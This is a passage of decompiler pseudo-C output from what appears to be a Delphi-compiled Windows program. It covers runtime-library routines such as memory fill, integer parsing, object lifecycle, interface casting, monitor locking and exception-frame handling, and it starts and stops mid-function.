    if ( a2 <= 0 )
    {
      return nullsub_1();
    }
    else
    {
      *((_BYTE *)a1 + a2 - 1) = a3;
      return ((int (*)(void))((char *)nullsub_1 - 2 * (a2 & 0xFFFFFFFE)))();
    }
  }
  else
  {
    *a1 = a3;
    a1[1] = a3;
    a1[2] = a3;
    a1[3] = a3;
    v3 = a2 - 16;
    v4 = *(double *)a1;
    *(double *)((char *)a1 + v3) = *(double *)a1;
    *(double *)((char *)a1 + v3 + 8) = v4;
    v5 = ((unsigned __int8)a1 & 7) - 8;
    v6 = v5 + v3;
    result = (int)a1 + v6 - v5;
    v8 = -v6;
    do
    {
      *(double *)(v8 + result) = v4;
      *(double *)(v8 + result + 8) = v4;
      v10 = __OFADD__(16, v8);
      v9 = v8 + 16 < 0;
      v8 += 16;
    }
    while ( v9 != v10 );
    __asm
    {
      ffree   st
      fincstp
    }
  }
  return result;
}
// 405252: using guessed type int nullsub_1(void);

//----- (00405254) --------------------------------------------------------
int __fastcall sub_405254(int result, unsigned int *a2)
{
  __int16 *v2; // esi
  int v3; // ebx
  __int16 v4; // bx
  char v5; // ch
  unsigned int v6; // esi
  unsigned __int16 v7; // bx
  unsigned __int16 v8; // bx
  int v9; // [esp-4h] [ebp-10h]

  v2 = (__int16 *)result;
  v9 = result;
  if ( !result )
    goto LABEL_21;
  result = 0;
  HIWORD(v3) = 0;
  do
    v4 = *v2++;
  while ( v4 == 32 );
  v5 = 0;
  if ( v4 == 45 )
  {
    v5 = 1;
    goto LABEL_26;
  }
  if ( v4 == 43 )
LABEL_26:
    v4 = *v2++;
  if ( v4 != 36 && v4 != 120 && v4 != 88 )
  {
    if ( v4 != 48 )
    {
      if ( v4 )
      {
LABEL_15:
        while ( 1 )
        {
          LOWORD(v3) = v4 - 48;
          if ( (unsigned __int16)v3 > 9u || (unsigned int)result > 0xCCCCCCC )
            break;
          result = v3 + 10 * result;
          v4 = *v2++;
          if ( !v4 )
            goto LABEL_18;
        }
      }
      goto LABEL_24;
    }
    v4 = *v2++;
    if ( v4 != 120 && v4 != 88 )
    {
      if ( v4 )
        goto LABEL_15;
LABEL_18:
      if ( v5 == 1 )
      {
        result = -result;
        if ( result >= 1 && result != 0 && result >= 0 )
          goto LABEL_24;
      }
      else if ( result < 0 )
      {
        goto LABEL_24;
      }
LABEL_37:
      v6 = 0;
      goto LABEL_38;
    }
  }
  v7 = *v2++;
  if ( v7 )
  {
    while ( 1 )
    {
      if ( v7 >= 0x61u )
        v7 -= 32;
      LOWORD(v3) = v7 - 48;
      if ( (unsigned __int16)v3 > 9u )
      {
        v8 = v3 - 17;
        if ( v8 > 5u )
          goto LABEL_24;
        LOWORD(v3) = v8 + 10;
      }
      if ( (unsigned int)result > 0xFFFFFFF )
        goto LABEL_24;
      result = v3 + 16 * result;
      v7 = *v2++;
      if ( !v7 )
      {
        if ( v5 == 1 )
          result = -result;
        goto LABEL_37;
      }
    }
  }
LABEL_21:
  ++v2;
LABEL_24:
  v6 = (unsigned int)v2 - v9;
LABEL_38:
  *a2 = v6 >> 1;
  return result;
}

//----- (00405514) --------------------------------------------------------
int __fastcall sub_405514(int a1, int a2)
{
  return sub_40B508(*(_DWORD *)(a1 - 56), a2);
}

//----- (0040552C) --------------------------------------------------------
int __fastcall sub_40552C(int a1)
{
  int result; // eax

  result = *(_DWORD *)(a1 - 48);
  if ( result )
    return *(_DWORD *)result;
  return result;
}

//----- (00405538) --------------------------------------------------------
_DWORD *__fastcall sub_405538(int a1)
{
  _DWORD *Mem; // eax

  Mem = (_DWORD *)System::__linkproc__ GetMem(*(_DWORD *)(a1 - 52));
  return sub_4055A4(a1, Mem);
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);

//----- (00405554) --------------------------------------------------------
int __fastcall sub_405554(int *a1)
{
  sub_4055FC(a1);
  return System::__linkproc__ FreeMem(a1);
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00405568) --------------------------------------------------------
int __fastcall sub_405568(int a1, char a2)
{
  int result; // eax

  if ( a2 )
    result = System::__linkproc__ ClassCreate();
  if ( a2 )
    return System::__linkproc__ AfterConstruction();
  return result;
}
// 405576: variable 'a2' is possibly undefined
// 4058CC: using guessed type int System::__linkproc__ AfterConstruction(void);

//----- (00405588) --------------------------------------------------------
int sub_405588()
{
  int result; // eax
  char v1; // dl

  result = System::__linkproc__ BeforeDestruction();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(result);
  return result;
}
// 40558F: variable 'v1' is possibly undefined
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type int System::__linkproc__ BeforeDestruction(void);

//----- (00405598) --------------------------------------------------------
_DWORD *__fastcall sub_405598(_DWORD *result)
{
  if ( result )
    return (_DWORD *)(*(int (**)(void))(*result - 4))();
  return result;
}

//----- (004055A4) --------------------------------------------------------
_DWORD *__fastcall sub_4055A4(int a1, _DWORD *a2)
{
  int v2; // ebx
  _DWORD *result; // eax
  int *v4; // ebx
  int v5; // ecx
  _DWORD *v6; // ebx
  int v7; // esi
  unsigned int v8; // [esp-4h] [ebp-10h] BYREF
  int v9; // [esp+0h] [ebp-Ch] BYREF

  v2 = a1;
  *a2 = a1;
  v8 = *(_DWORD *)(a1 - 52);
  memset(a2 + 1, 0, 4 * ((v8 >> 2) - 1) + (v8 & 3));
  result = a2;
  while ( 1 )
  {
    if ( *(_DWORD *)(v2 - 84) )
      v8 = *(_DWORD *)(v2 - 84);
    v4 = *(int **)(v2 - 48);
    if ( !v4 )
      break;
    v2 = *v4;
  }
  if ( &v8 != (unsigned int *)&v9 )
  {
    v5 = *(_DWORD *)v8;
    v6 = (_DWORD *)(v8 + 4);
    do
    {
      v7 = v6[4];
      if ( v7 )
        *(_DWORD *)((char *)a2 + v6[5]) = v7;
      v6 += 7;
      --v5;
    }
    while ( v5 );
  }
  return result;
}

//----- (004055FC) --------------------------------------------------------
_DWORD *__fastcall sub_4055FC(int *a1)
{
  int *v2; // esi
  int *v3; // edi
  int v4; // edi
  int v5; // edx
  int v6; // eax
  int v7; // esi
  int v8; // edx

  v2 = a1;
  v3 = a1;
  while ( v3 )
  {
    v4 = *v3;
    v5 = *(_DWORD *)(v4 - 84);
    v3 = *(int **)(v4 - 48);
    if ( v5 )
    {
      sub_40AF90(a1);
      break;
    }
  }
  v6 = (int)v2;
  do
  {
    v7 = *v2;
    v8 = *(_DWORD *)(v7 - 76);
    v2 = *(int **)(v7 - 48);
    if ( v8 )
    {
      sub_407DEC(v6, v8);
      v6 = (int)a1;
    }
  }
  while ( v2 );
  return sub_405B3C(a1);
}

//----- (00405640) --------------------------------------------------------
int __fastcall sub_405640(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int v4; // ecx

  v4 = a2;
  if ( a2 >= 0xFF000000 )
    return System::__linkproc__ IntfCopy(a3, *(_DWORD *)((char *)a1 + (v4 & 0xFFFFFF)));
  if ( v4 < 0xFE000000 )
    return ((int (__fastcall *)(_DWORD *, int))v4)(a1, a3);
  return (*(int (**)(void))(*a1 + (__int16)v4))();
}
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);

//----- (0040567C) --------------------------------------------------------
int __fastcall sub_40567C(int *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v5; // eax
  _DWORD *v6; // esi
  int v7; // eax
  int v8; // eax
  int v9; // ebx
  unsigned int v11[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v12; // [esp-4h] [ebp-18h]
  int v13; // [esp+Ch] [ebp-8h] BYREF
  _DWORD *v14; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v13 = 0;
  v14 = a2;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_405717;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  *a3 = 0;
  v5 = sub_405728(*a1, v14);
  v6 = v5;
  if ( v5 )
  {
    v7 = v5[5];
    if ( v7 )
    {
      v8 = (int)a1 + v7;
      *a3 = v8;
      if ( *a3 )
        v8 = (*(int (__stdcall **)(_DWORD))(*(_DWORD *)*a3 + 4))(*a3);
    }
    else
    {
      sub_405640(a1, v6[6], (int)&v13);
      v8 = System::__linkproc__ IntfCopy(a3, v13);
    }
  }
  else if ( sub_40B620(dword_465044, v14) )
  {
    *a3 = a1;
  }
  LOBYTE(v8) = *a3 != 0;
  v9 = v8;
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_40571E;
  System::__linkproc__ IntfClear(&v13);
  return v9;
}
// 4056FF: variable 'v8' is possibly undefined
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);
// 465044: using guessed type _DWORD dword_465044[4];

//----- (00405728) --------------------------------------------------------
_DWORD *__fastcall sub_405728(int a1, _DWORD *a2)
{
  int *v3; // eax
  int v4; // ecx
  _DWORD *result; // eax
  int *v6; // ebx

  while ( 1 )
  {
    v3 = *(int **)(a1 - 84);
    if ( v3 )
      break;
LABEL_8:
    v6 = *(int **)(a1 - 48);
    if ( !v6 )
      return 0;
    a1 = *v6;
  }
  v4 = *v3;
  result = v3 + 1;
  while ( *a2 != *result || a2[1] != result[1] || a2[2] != result[2] || a2[3] != result[3] )
  {
    result += 7;
    if ( !--v4 )
      goto LABEL_8;
  }
  return result;
}

//----- (0040576C) --------------------------------------------------------
bool __fastcall sub_40576C(int *a1, int a2)
{
  return a1 && sub_40580C(*a1, a2);
}

//----- (00405790) --------------------------------------------------------
int *__fastcall sub_405790(int *a1, int a2)
{
  if ( a1 && !sub_40576C(a1, a2) )
    unknown_libname_28();
  return a1;
}

//----- (004057C0) --------------------------------------------------------
int *__fastcall sub_4057C0(int a1, int a2)
{
  int *v3; // [esp-8h] [ebp-8h] BYREF
  int v4; // [esp-4h] [ebp-4h]

  v4 = a2;
  v3 = 0;
  System::__linkproc__ IntfCast(&v3, a1, dword_465044);
  return sub_405790(v3, v4);
}
// 40A090: using guessed type int __fastcall System::__linkproc__ IntfCast(_DWORD, _DWORD, _DWORD);
// 465044: using guessed type _DWORD dword_465044[4];

//----- (004057DC) --------------------------------------------------------
int __fastcall sub_4057DC(int a1, unsigned __int16 a2)
{
  int i; // edx
  unsigned __int16 *v5; // edi
  int v6; // ecx
  bool v7; // zf
  _WORD *v8; // edi
  int *v9; // edx
  int v11; // [esp-4h] [ebp-8h]

  for ( i = a1; ; i = *v9 )
  {
    v5 = *(unsigned __int16 **)(i - 60);
    if ( v5 )
    {
      v6 = *v5;
      v11 = v6;
      v7 = v5 + 1 == 0;
      v8 = v5 + 1;
      do
      {
        if ( !v6 )
          break;
        v7 = *v8++ == a2;
        --v6;
      }
      while ( !v7 );
      if ( v7 )
        break;
    }
    v9 = *(int **)(i - 48);
    if ( !v9 )
      return 0;
  }
  return *(_DWORD *)&v8[2 * v11 - v6 - 2];
}

//----- (0040580C) --------------------------------------------------------
char __fastcall sub_40580C(int a1, int a2)
{
  int *v2; // eax

  while ( a1 != a2 )
  {
    v2 = *(int **)(a1 - 48);
    if ( !v2 )
      return (char)v2;
    a1 = *v2;
  }
  LOBYTE(v2) = 1;
  return (char)v2;
}

//----- (00405828) --------------------------------------------------------
int __fastcall sub_405828(int *a1, int a2)
{
  return sub_405514(*a1, a2);
}

//----- (00405848) --------------------------------------------------------
int __fastcall sub_405848(int *a1, unsigned __int16 *a2)
{
  unsigned __int16 v2; // dx
  int (__fastcall *v3)(int *, unsigned __int16 *); // ecx
  int *v5; // [esp-8h] [ebp-8h]

  v2 = *a2;
  if ( v2
    && v2 < 0xC000u
    && (v5 = a1, v3 = (int (__fastcall *)(int *, unsigned __int16 *))sub_4057DC(*a1, v2), a1 = v5, v3) )
  {
    return v3(v5, a2);
  }
  else
  {
    return (*(int (**)(void))(*a1 - 16))();
  }
}

//----- (0040592C) --------------------------------------------------------
void __fastcall sub_40592C(int *a1)
{
  int v2; // eax
  int v3; // ecx

  v2 = *a1;
  if ( v2 <= 10 && dword_46905C > 1 )
  {
    sub_4059A4(4 << v2);
  }
  else
  {
    if ( v2 < 10 )
      v3 = v2;
    else
      v3 = v2 - 10;
    if ( v3 % 20 == 19 )
    {
      Sleep(1u);
    }
    else if ( v3 % 5 == 4 )
    {
      Sleep(0);
    }
    else
    {
      SwitchToThread();
    }
  }
  if ( ++*a1 < 0 )
    *a1 = 10;
}
// 46905C: using guessed type int dword_46905C;

//----- (004059A4) --------------------------------------------------------
int __fastcall sub_4059A4(int result)
{
  for ( ; result > 0; --result )
    _mm_pause();
  return result;
}

//----- (004059B4) --------------------------------------------------------
int sub_4059B4()
{
  HMODULE ModuleHandleW; // eax
  PSYSTEM_LOGICAL_PROCESSOR_INFORMATION v1; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v4; // [esp-8h] [ebp-14h]
  int *v5; // [esp-4h] [ebp-10h]
  DWORD ReturnedLength; // [esp+0h] [ebp-Ch] BYREF
  PSYSTEM_LOGICAL_PROCESSOR_INFORMATION Buffer; // [esp+4h] [ebp-8h]
  int LineSize; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  ReturnedLength = 0;
  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  if ( !GetProcAddress(ModuleHandleW, "GetLogicalProcessorInformation")
    || GetLogicalProcessorInformation(0, &ReturnedLength)
    || GetLastError() != 122 )
  {
    return 64;
  }
  Buffer = (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION)System::__linkproc__ GetMem(ReturnedLength);
  v5 = &savedregs;
  v4 = &loc_405A62;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  GetLogicalProcessorInformation(Buffer, &ReturnedLength);
  v1 = Buffer;
  if ( !ReturnedLength )
  {
LABEL_9:
    __writefsdword(0, (unsigned int)ExceptionList);
    v5 = (int *)&loc_405A69;
    System::__linkproc__ FreeMem(Buffer);
    return 64;
  }
  while ( LOWORD(v1->Relationship) != 2 || v1->ProcessorCore.Flags != 1 )
  {
    ++v1;
    ReturnedLength -= 24;
    if ( !ReturnedLength )
      goto LABEL_9;
  }
  LineSize = v1->Cache.LineSize;
  System::__linkproc__ TryFinallyExit(ExceptionList, v4, v5);
  return LineSize;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (00405AB4) --------------------------------------------------------
void __fastcall sub_405AB4(int a1, int a2, int a3)
{
  if ( !dword_4698F4 )
    sub_404ED0(26, a2, a3);
}
// 4698F4: using guessed type int dword_4698F4;

//----- (00405AC8) --------------------------------------------------------
int __fastcall sub_405AC8(int a1)
{
  int v1; // ebx
  int v2; // edx
  int v3; // ecx

  v1 = *(_DWORD *)(a1 + 8);
  if ( v1 != GetCurrentThreadId() )
    sub_404ED0(25, v2, v3);
  return v1;
}
// 405AD7: variable 'v2' is possibly undefined
// 405AD7: variable 'v3' is possibly undefined

//----- (00405AE0) --------------------------------------------------------
int sub_405AE0()
{
  int result; // eax

  if ( !dword_469000 )
    _InterlockedExchange((volatile __int32 *)&dword_469000, sub_4059B4());
  if ( dword_46905C > 1 && !dword_469004 )
    _InterlockedExchange(&dword_469004, 1000);
  if ( (int)dword_469000 <= 28 )
    result = System::AllocMem(0x1Cu);
  else
    result = System::AllocMem(dword_469000);
  *(_DWORD *)(result + 16) = dword_469004;
  return result;
}
// 469004: using guessed type int dword_469004;
// 46905C: using guessed type int dword_46905C;

//----- (00405B3C) --------------------------------------------------------
_DWORD *__fastcall sub_405B3C(_DWORD *a1)
{
  _DWORD *result; // eax
  int v2; // edx

  result = (_DWORD *)sub_405E08(a1);
  v2 = *result & 0xFFFFFFFE;
  if ( v2 )
  {
    *result = 0;
    return (_DWORD *)sub_405B58(v2);
  }
  return result;
}

//----- (00405B58) --------------------------------------------------------
int __fastcall sub_405B58(int a1)
{
  if ( dword_4698F4 && *(_DWORD *)(a1 + 12) )
    (*(void (__fastcall **)(_DWORD))(dword_4698F4 + 4))(*(_DWORD *)(a1 + 12));
  return System::__linkproc__ FreeMem(a1);
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 4698F4: using guessed type int dword_4698F4;

//----- (00405B84) --------------------------------------------------------
int __fastcall sub_405B84(_DWORD *a1, unsigned int a2, int a3)
{
  int v5; // eax

  sub_405AB4((int)a1, a2, a3);
  v5 = sub_405E18(a1);
  return sub_405BA0(v5, a2);
}

//----- (00405BA0) --------------------------------------------------------
int __fastcall sub_405BA0(int a1, unsigned int a2)
{
  int v4; // ebp
  unsigned int v5; // eax
  signed __int32 v6; // ebx
  signed __int32 v7; // eax
  signed __int32 v8; // ebx
  volatile signed __int32 v9; // ebx
  unsigned __int8 v11; // [esp+0h] [ebp-20h]
  char v12; // [esp+1h] [ebp-1Fh]
  DWORD TickCount; // [esp+4h] [ebp-1Ch]
  DWORD v14; // [esp+4h] [ebp-1Ch]
  DWORD v15; // [esp+8h] [ebp-18h]
  int v16[5]; // [esp+Ch] [ebp-14h] BYREF

  v4 = *(_DWORD *)(a1 + 16);
  while ( 1 )
  {
    v11 = sub_405E68(a1);
    if ( v11 || !a2 )
      return v11;
    v12 = 0;
    if ( v4 <= 0 )
      goto LABEL_18;
    TickCount = GetTickCount();
    v16[0] = 0;
    do
    {
      if ( a2 != -1 && a2 <= GetTickCount() - TickCount )
        return 0;
      if ( *(int *)a1 > 1 )
        break;
      if ( !*(_DWORD *)a1 && !_InterlockedCompareExchange((volatile signed __int32 *)a1, 1, 0) )
      {
        *(_DWORD *)(a1 + 8) = GetCurrentThreadId();
        *(_DWORD *)(a1 + 4) = 1;
        return 1;
      }
      sub_40592C(v16);
      --v4;
    }
    while ( v4 > 0 );
    if ( a2 == -1 )
      goto LABEL_18;
    v5 = GetTickCount() - TickCount;
    if ( a2 <= v5 )
      return 0;
    a2 -= v5;
LABEL_18:
    while ( *(_DWORD *)a1 )
    {
      v6 = *(_DWORD *)a1;
      if ( v6 == _InterlockedCompareExchange((volatile signed __int32 *)a1, v6 + 2, v6) )
      {
        do
        {
          v14 = GetTickCount();
          v7 = sub_405D98(a1);
          v11 = (*(int (__fastcall **)(_DWORD, signed __int32, unsigned int))(dword_4698F4 + 16))(0, v7, a2) == 0;
          if ( a2 != -1 )
          {
            v15 = GetTickCount();
            if ( a2 <= v15 - v14 )
              a2 = 0;
            else
              a2 -= v15 - v14;
          }
          if ( v11 )
          {
            while ( (*(_DWORD *)a1 & 1) == 0 )
            {
              v8 = *(_DWORD *)a1;
              if ( v8 == _InterlockedCompareExchange((volatile signed __int32 *)a1, (v8 - 2) | 1, v8) )
              {
                v12 = 1;
                break;
              }
            }
          }
          else
          {
            do
              v9 = *(_DWORD *)a1;
            while ( v9 != _InterlockedCompareExchange((volatile signed __int32 *)a1, *(_DWORD *)a1 - 2, *(_DWORD *)a1) );
            v12 = 1;
          }
        }
        while ( !v12 );
        if ( v11 )
        {
          *(_DWORD *)(a1 + 8) = GetCurrentThreadId();
          *(_DWORD *)(a1 + 4) = 1;
        }
        return v11;
      }
    }
  }
}
// 405BE8: conditional instruction was optimized away because ebp.4>=1
// 4698F4: using guessed type int dword_4698F4;
// 405BA0: using guessed type int var_14[5];

//----- (00405D38) --------------------------------------------------------
int __fastcall sub_405D38(int a1)
{
  int result; // eax
  volatile signed __int32 v3; // ebx
  signed __int32 v4; // eax

  result = sub_405AC8(a1);
  if ( !--*(_DWORD *)(a1 + 4) )
  {
    *(_DWORD *)(a1 + 8) = 0;
    do
    {
      v3 = *(_DWORD *)a1;
      result = _InterlockedCompareExchange((volatile signed __int32 *)a1, *(_DWORD *)a1 - 1, *(_DWORD *)a1);
    }
    while ( v3 != result );
    if ( (v3 & 0xFFFFFFFE) != 0 )
    {
      v4 = sub_405D98(a1);
      return (*(int (__fastcall **)(signed __int32, _DWORD, _DWORD))(dword_4698F4 + 16))(v4, 0, 0);
    }
  }
  return result;
}
// 4698F4: using guessed type int dword_4698F4;

//----- (00405D80) --------------------------------------------------------
int __fastcall sub_405D80(_DWORD *a1, int a2, int a3)
{
  int v4; // eax

  sub_405AB4((int)a1, a2, a3);
  v4 = sub_405E18(a1);
  return sub_405D38(v4);
}

//----- (00405D98) --------------------------------------------------------
signed __int32 __fastcall sub_405D98(int a1)
{
  signed int v2; // esi
  signed __int32 v3; // ebx
  signed __int32 v4; // edx

  v2 = 1;
  v3 = *(_DWORD *)(a1 + 12);
  if ( !v3 )
  {
    while ( 1 )
    {
      v4 = (*(int (**)(void))dword_4698F4)();
      v3 = _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 12), v4, 0);
      if ( v3 )
      {
        if ( v4 )
          (*(void (__fastcall **)(signed __int32))(dword_4698F4 + 4))(v4);
      }
      else
      {
        v3 = v4;
      }
      if ( v3 )
        break;
      Sleep(v2);
      if ( v2 <= 512 )
        v2 *= 2;
      else
        v2 = 1;
    }
  }
  return v3;
}
// 4698F4: using guessed type int dword_4698F4;

//----- (00405DF8) --------------------------------------------------------
int __fastcall sub_405DF8(_DWORD *a1)
{
  return (int)a1 + *(_DWORD *)(*a1 - 52) - 4;
}

//----- (00405E08) --------------------------------------------------------
int __fastcall sub_405E08(_DWORD *a1)
{
  return (int)a1 + *(_DWORD *)(*a1 - 52) - 4;
}

//----- (00405E18) --------------------------------------------------------
unsigned int __fastcall sub_405E18(_DWORD *a1)
{
  volatile signed __int32 *v1; // esi
  unsigned int v2; // ebx
  int v3; // edx
  signed __int32 v5; // [esp+0h] [ebp-Ch]

  v1 = (volatile signed __int32 *)sub_405E08(a1);
  v5 = *v1;
  v2 = *v1 & 0xFFFFFFFE;
  if ( !v2 )
  {
    v3 = sub_405AE0();
    do
    {
      _InterlockedCompareExchange(v1, v3 | v5 & 1, v5);
      v5 = *v1;
      v2 = *v1 & 0xFFFFFFFE;
    }
    while ( !v2 );
    if ( v3 != v2 )
      System::__linkproc__ FreeMem(v3);
  }
  return v2;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00405E68) --------------------------------------------------------
char __fastcall sub_405E68(int a1)
{
  if ( GetCurrentThreadId() == *(_DWORD *)(a1 + 8) )
  {
    ++*(_DWORD *)(a1 + 4);
    return 1;
  }
  else if ( *(_DWORD *)a1 || _InterlockedCompareExchange((volatile signed __int32 *)a1, 1, 0) )
  {
    return 0;
  }
  else
  {
    *(_DWORD *)(a1 + 8) = GetCurrentThreadId();
    *(_DWORD *)(a1 + 4) = 1;
    return 1;
  }
}

//----- (00406340) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_406340@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<ebp>, int a4@<edi>, int a5@<esi>)
{
  void **v5; // edx
  void ***v6; // eax
  int v7; // ecx
  int (__cdecl *v9)(int, int, int); // [esp-5Ch] [ebp-5Ch]
  void **v10; // [esp-1Ch] [ebp-1Ch] BYREF
  int v11; // [esp-18h] [ebp-18h]
  int v12; // [esp-14h] [ebp-14h]
  int v13; // [esp-10h] [ebp-10h]
  int v14; // [esp-Ch] [ebp-Ch]
  int v15; // [esp-8h] [ebp-8h]
  void **v16; // [esp-4h] [ebp-4h]
  void *retaddr; // [esp+0h] [ebp+0h] BYREF

  if ( !a1 )
    sub_406AB0(0xD8u, a2);
  v5 = v16;
  v16 = &retaddr;
  v15 = a3;
  v14 = a4;
  v13 = a5;
  v12 = a2;
  v11 = a1;
  v10 = v5;
  v6 = &v10;
  if ( dword_469024 )
  {
    v7 = ((int (__cdecl *)(int, void ***, void **, int, void **, int, int, int, int, int, void **, void **, int, int, int, void ***))unknown_libname_188)(
           dword_469024,
           &v10,
           v10,
           7,
           v10,
           v11,
           v12,
           v13,
           v14,
           v15,
           v16,
           v5,
           250477278,
           1,
           7,
           &v10);
    if ( v7 )
      v7 = *(_DWORD *)(v7 + 12);
    v6 = (void ***)v9(250477278, 1, v7);
  }
  return ((int (__fastcall *)(void ***))dword_46901C)(v6);
}
// 40634F: positive sp value 4 has been found
// 4063A1: variable 'v9' is possibly undefined
// 404E6C: using guessed type _DWORD unknown_libname_188();
// 46901C: using guessed type int dword_46901C;
// 469024: using guessed type int dword_469024;

//----- (0040658C) --------------------------------------------------------
struct _EXCEPTION_REGISTRATION_RECORD **__usercall sub_40658C@<eax>(
        int a1@<eax>,
        struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebp>)
{
  struct _EXCEPTION_REGISTRATION_RECORD **result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // ecx

  result = &a2[-2].Next;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&a2[-2]);
  *result = ExceptionList;
  result[1] = (struct _EXCEPTION_REGISTRATION_RECORD *)unknown_libname_43;
  result[2] = a2;
  *(_DWORD *)(a1 + 4) = a2 - 2;
  return result;
}
// 4064EC: using guessed type int unknown_libname_43();

//----- (004065AC) --------------------------------------------------------
struct _EXCEPTION_REGISTRATION_RECORD *__fastcall sub_4065AC(int a1)
{
  struct _EXCEPTION_REGISTRATION_RECORD *result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // ecx

  result = *(struct _EXCEPTION_REGISTRATION_RECORD **)(a1 + 4);
  if ( result )
  {
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    if ( result == ExceptionList )
    {
      result = result->Next;
      __writefsdword(0, (unsigned int)result);
    }
    else
    {
      while ( ExceptionList != (struct _EXCEPTION_REGISTRATION_RECORD *)-1 )
      {
        if ( ExceptionList->Next == result )
        {
          result = result->Next;
          ExceptionList->Next = result;
          return result;
        }
        ExceptionList = ExceptionList->Next;
      }
    }
  }
  return result;
}

//----- (004065D4) --------------------------------------------------------
int sub_4065D4()
{
  int result; // eax
  int v1; // ebx
  int v2; // edi
  void (*v3)(void); // esi
  unsigned int v4[6]; // [esp-Ch] [ebp-18h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  result = dword_46BB9C;
  if ( dword_46BB9C )
  {
    v1 = dword_46BBA0;
    v2 = *(_DWORD *)(dword_46BB9C + 4);
    v4[2] = (unsigned int)&savedregs;
    v4[1] = (unsigned int)&loc_406622;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    while ( v1 > 0 )
    {
      dword_46BBA0 = --v1;
      v3 = *(void (**)(void))(v2 + 8 * v1 + 4);
      if ( v3 )
      {
        if ( *(_DWORD *)v3 )
          v3();
      }
    }
    result = 0;
    __writefsdword(0, v4[0]);
  }
  return result;
}
// 46BB9C: using guessed type int dword_46BB9C;
// 46BBA0: using guessed type int dword_46BBA0;

//----- (0040663C) --------------------------------------------------------
int sub_40663C()
{
  int result; // eax
  int v1; // edi
  int v2; // ebx
  void (*v3)(void); // esi
  unsigned int v4[6]; // [esp-Ch] [ebp-1Ch] BYREF
  int v5; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  result = dword_46BB9C;
  if ( dword_46BB9C )
  {
    v1 = *(_DWORD *)dword_46BB9C;
    v2 = 0;
    v5 = *(_DWORD *)(dword_46BB9C + 4);
    v4[2] = (unsigned int)&savedregs;
    v4[1] = (unsigned int)&loc_40668E;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    if ( v1 > 0 )
    {
      do
      {
        v3 = *(void (**)(void))(v5 + 8 * v2++);
        dword_46BBA0 = v2;
        if ( v3 )
        {
          if ( *(_DWORD *)v3 )
            v3();
        }
      }
      while ( v1 > v2 );
    }
    result = 0;
    __writefsdword(0, v4[0]);
  }
  return result;
}
// 46BB9C: using guessed type int dword_46BB9C;
// 46BBA0: using guessed type int dword_46BBA0;

//----- (004066F0) --------------------------------------------------------
_DWORD *__fastcall sub_4066F0(int **a1, int a2, CHAR **a3)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-1Ch] BYREF
  void *v7; // [esp-14h] [ebp-18h]
  int *v8; // [esp-10h] [ebp-14h]
  void *v9; // [esp-Ch] [ebp-10h]
  int v10; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v8 = &savedregs;
  v7 = &loc_406738;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40B51C(a1, &v10);
  sub_407634(a3, (const WCHAR *)v10, a2, (unsigned __int16)ExceptionList);
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_40673F;
  return sub_406C44(&v10);
}

//----- (00406798) --------------------------------------------------------
int **__fastcall sub_406798(int **a1, _DWORD *a2)
{
  return sub_40B51C(a1, a2);
}

//----- (004067AC) --------------------------------------------------------
void *__fastcall sub_4067AC(_DWORD *a1)
{
  int v1; // edi
  _DWORD **v2; // esi
  int **v3; // eax
  unsigned int v4; // ecx
  unsigned int v5; // ecx
  void *result; // eax

  v1 = *a1;
  v2 = (_DWORD **)(a1 + 1);
  do
  {
    v3 = (int **)*v2[1];
    v4 = (unsigned int)v2[2];
    if ( !(_WORD)v4 )
      goto LABEL_6;
    v5 = v4 - 1;
    if ( v5 )
